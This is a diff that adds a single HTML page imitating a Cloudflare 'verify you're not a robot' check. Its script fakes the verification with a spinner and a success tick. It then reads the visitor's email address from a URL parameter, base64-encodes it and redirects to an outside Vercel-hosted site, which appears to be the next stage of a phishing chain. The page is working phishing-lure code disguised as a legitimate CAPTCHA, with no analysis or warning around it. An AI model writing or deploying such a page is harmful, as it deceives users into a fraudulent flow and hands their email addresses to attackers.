@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f9f9f9; /* Soft whitish background */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        .instruction {
+            margin-bottom: 24px;
+            text-align: center;
+            font-size: 16px;
+            color: #555;
+        }
+
+        .verification-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+            padding: 24px;
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #eaeaea;
+        }
+
+        .verification-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-container {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 16px;
+            color: #333;
+            transition: color 0.2s ease;
+        }
+
+        .checkbox-label:hover {
+            color: #000;
+        }
+
+        .custom-checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox:checked + .checkbox-label .custom-checkbox {
+            border-color: #4CAF50;
+            background-color: #4CAF50;
+        }
+
+        .checkbox:checked + .checkbox-label .custom-checkbox::after {
+            content: "";
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-top: -1px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid #4CAF50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 12px;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-check {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background-color: #4CAF50;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            display: none;
+        }
+
+        .success-check::after {
+            content: "";
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-top: -1px;
+        }
+
+        .verification-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .logo {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            border-radius: 4px;
+        }
+
+        .brand {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            letter-spacing: 0.5px;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .footer a:hover {
+            color: #333;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="instruction">
+        To view this document, verify you're not a robot below
+    </div>
+
+    <div class="verification-container">
+        <div class="verification-left">
+            <div class="checkbox-container">
+                <input type="checkbox" id="verification-checkbox" class="checkbox">
+                <label for="verification-checkbox" class="checkbox-label">
+                    <span class="custom-checkbox"></span>
+                    <span id="verification-text">Verify</span>
+                </label>
+            </div>
+
+            <div class="spinner" id="spinner"></div>
+            <div class="success-check" id="success-check"></div>
+        </div>
+
+        <div class="verification-right">
+            <div class="logo-container">
+                <img src="cloudflare_.png" alt="Cloudflare" class="logo" style="width:24px;height:24px;">
+                <div class="brand">JOLLYTECH</div>
+            </div>
+            <div class="footer">
+                <a href="#">Privacy</a> · <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Function to encode string to base64
+        function encodeBase64(str) {
+            // For browser compatibility
+            if (typeof btoa === 'function') {
+                return btoa(str);
+            }
+            // Fallback for Node.js environment (though not needed in browser)
+            return Buffer.from(str).toString('base64');
+        }
+
+        // Function to get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            const results = regex.exec(window.location.href);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Function to build redirect URL with encoded email
+        function buildRedirectUrl() {
+            const baseRedirectUrl = 'https://xyz123-blush.vercel.app/';
+            const email = getUrlParameter('eoff');
+
+            if (email) {
+                // Encode the email in base64
+                const encodedEmail = encodeBase64(email);
+                // Return the redirect URL with encoded email parameter
+                return `${baseRedirectUrl}?eoff=${encodedEmail}`;
+            }
+
+            // If no email parameter, just redirect to base URL
+            return baseRedirectUrl;
+        }
+
+        document.getElementById('verification-checkbox').addEventListener('change', function() {
+            const checkbox = this;
+            const verificationText = document.getElementById('verification-text');
+            const customCheckbox = document.querySelector('.custom-checkbox');
+            const spinner = document.getElementById('spinner');
+            const successCheck = document.getElementById('success-check');
+
+            if (checkbox.checked) {
+                // Hide the checkbox and show spinner
+                customCheckbox.style.display = 'none';
+                spinner.style.display = 'block';
+                verificationText.textContent = 'Verifying...';
+
+                // Simulate verification process
+                setTimeout(function() {
+                    // Hide spinner and show success check
+                    spinner.style.display = 'none';
+                    successCheck.style.display = 'flex';
+
+                    // Change text to "Success!"
+                    verificationText.textContent = 'Success!';
+
+                    // Build the redirect URL with encoded email
+                    const redirectUrl = buildRedirectUrl();
+
+                    // Log for debugging (remove in production)
+                    console.log('Redirecting to:', redirectUrl);
+
+                    // Redirect after a brief delay
+                    setTimeout(function() {
+                        window.location.href = redirectUrl;
+                    }, 1000);
+                }, 1500);
+            } else {
+                // Reset if unchecked (though this shouldn't happen in normal flow)
+                customCheckbox.style.display = 'flex';
+                spinner.style.display = 'none';
+                successCheck.style.display = 'none';
+                verificationText.textContent = 'Verify';
+            }
+        });
+    </script>
+</body>
+</html>
